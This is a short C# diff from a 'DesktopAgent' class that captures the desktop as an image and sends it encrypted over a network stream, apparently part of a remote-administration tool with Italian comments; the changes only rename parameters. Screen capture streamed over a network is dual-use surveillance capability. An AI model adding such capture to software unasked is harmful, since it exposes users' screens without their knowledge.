@@ -17,9 +17,9 @@ namespace bc.srv.Muduli.Desktop
         private Size size = SystemInformation.PrimaryMonitorSize;
 
 
-        public DesktopAgent(NetworkStream ctor_Stream)
+        public DesktopAgent(NetworkStream ctorStream)
         {
-            desktopNetwork = ctor_Stream;
+            desktopNetwork = ctorStream;
             mfm = new MsgFileManager(desktopNetwork);
             mm = new MsgManager(desktopNetwork);
         }
@@ -110,13 +110,13 @@ namespace bc.srv.Muduli.Desktop
         /// <summary>
         ///     Manda Desktop Preview
         /// </summary>
-        private void SendDesktop(int _width, int _height, int _quality)
+        private void SendDesktop(int width, int height, int quality)
         {
             //MsgFileManager mfm = new MsgFileManager(desktopNetwork);
             //MsgManager mm = new MsgManager(desktopNetwork);
 
             var iw = new ImageWorker();
-            var dsk = iw.DesktopImage(_width, _height, _quality);
+            var dsk = iw.DesktopImage(width, height, quality);
 
             if (dsk != null)
                 mfm.SendEncryFileByte(dsk, 10000); // invio il desktop preview            
